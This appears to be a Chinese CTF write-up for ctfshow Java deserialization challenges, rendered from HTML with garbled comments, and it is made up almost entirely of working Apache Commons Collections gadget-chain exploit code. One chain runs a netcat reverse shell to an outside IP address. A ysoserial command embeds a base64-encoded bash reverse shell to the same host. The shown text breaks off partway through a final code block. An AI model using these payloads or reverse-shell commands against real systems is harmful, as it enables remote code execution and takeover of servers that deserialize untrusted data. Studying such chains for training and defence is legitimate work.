class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC42</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\æ¼æ´å¤ç°\\cc\\CC1\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        <span class="comment">//å¯¹ç¬¬ä¸€ä¸ªè¿›è¡Œçš„è°ƒç”¨</span></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        <span class="comment">//ç¬¬äºŒä¸ªå¯ä»¥ä¸ä¼ </span></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web850">web850</h2><p>è¿™é‡Œæ’‘ä¸ä½äº†ï¼Œåªèƒ½ä¸Šysoserialäº†ï¼Œä¸ªäººæ„Ÿè§‰å¯èƒ½æ˜¯ä»£ç†ç±»çš„é—®é¢˜</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>ysoserial-all.<span class="keyword">jar </span>CommonsCollections3 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="title">|base64</span></span><br></pre></td></tr></table></figure><h2 id="web851-web853">web851-web853</h2><p>cc4ï¼Œè¿™é‡Œåœ¨åå°„ä¹‹å‰ç”¨æ¥ä¿®æ”¹çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ctfshowTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        Class ct = templates.getClass();</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\æ¼æ´å¤ç°\\cc\\CC1\\target\\classes\\shell.class&quot;));</span></span><br><span class="line"><span class="comment">//        byte[][] bytes = &#123;code&#125;;</span></span><br><span class="line"><span class="comment">//        Field ctDeclaredField = ct.getDeclaredField(&quot;_bytecodes&quot;);</span></span><br><span class="line"><span class="comment">//        ctDeclaredField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        ctDeclaredField.set(templates,bytes);</span></span><br><span class="line"><span class="comment">//        Field nameField = ct.getDeclaredField(&quot;_name&quot;);</span></span><br><span class="line"><span class="comment">//        nameField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        nameField.set(templates,&quot;Chu0&quot;);</span></span><br><span class="line"><span class="comment">//        Field tfactory = ct.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers = new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(TrAXFilter.class),</span></span><br><span class="line"><span class="comment">//                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;nc 110.41.17.183 250 -e /bin/sh&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨Hashtableæ¥æ„é€ åˆ©ç”¨é“¾è°ƒç”¨LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Class&lt;DefaultedMap&gt; d = DefaultedMap.class;</span><br><span class="line">        Constructor&lt;DefaultedMap&gt; declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(declaredConstructor);</span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap1</span> <span class="operator">=</span> declaredConstructor.newInstance(hashMap1, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">2</span>));</span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap2</span> <span class="operator">=</span> declaredConstructor.newInstance(hashMap2, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">        defaultedMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        defaultedMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(defaultedMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(defaultedMap2, <span class="number">1</span>);</span><br><span class="line">        defaultedMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> DefaultedMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformers1</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        transformers1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformers1.set(defaultedMap1,transformerChain2);</span><br><span class="line">        transformers1.set(defaultedMap2,transformerChain2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        <span class="comment">//unserialize(&quot;./ser.bin&quot;);</span></span><br><span class="line"><span class="comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream oos = new ObjectOutputStream(baos);</span></span><br><span class="line"><span class="comment">//        oos.writeObject(hashtable);</span></span><br><span class="line"><span class="comment">//        String payload = new String(Base64.getEncoder().encode(baos.toByteArray()));</span></span><br><span class="line"><span class="comment">//        System.out.println(payload);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»™ä¸¤ä¸ªç‰ˆæœ¬å§ï¼ˆå…¶å®ä¸»è¦æ˜¯ä¸ºäº†è‡ªå·±çœ‹ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ctfshowTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        Class ct = templates.getClass();</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\æ¼æ´å¤ç°\\cc\\CC1\\target\\classes\\shell.class&quot;));</span></span><br><span class="line"><span class="comment">//        byte[][] bytes = &#123;code&#125;;</span></span><br><span class="line"><span class="comment">//        Field ctDeclaredField = ct.getDeclaredField(&quot;_bytecodes&quot;);</span></span><br><span class="line"><span class="comment">//        ctDeclaredField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        ctDeclaredField.set(templates,bytes);</span></span><br><span class="line"><span class="comment">//        Field nameField = ct.getDeclaredField(&quot;_name&quot;);</span></span><br><span class="line"><span class="comment">//        nameField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        nameField.set(templates,&quot;Chu0&quot;);</span></span><br><span class="line"><span class="comment">//        Field tfactory = ct.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers = new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(TrAXFilter.class),</span></span><br><span class="line"><span class="comment">//                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">2</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨Hashtableæ¥æ„é€ åˆ©ç”¨é“¾è°ƒç”¨LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Class&lt;DefaultedMap&gt; d = DefaultedMap.class;</span><br><span class="line">        Constructor&lt;DefaultedMap&gt; declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(declaredConstructor);</span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap1</span> <span class="operator">=</span> declaredConstructor.newInstance(hashMap1, transformerChain2);</span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap2</span> <span class="operator">=</span> declaredConstructor.newInstance(hashMap2, transformerChain2);</span><br><span class="line"></span><br><span class="line">        defaultedMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        defaultedMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(defaultedMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(defaultedMap2, <span class="number">1</span>);</span><br><span class="line">        defaultedMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        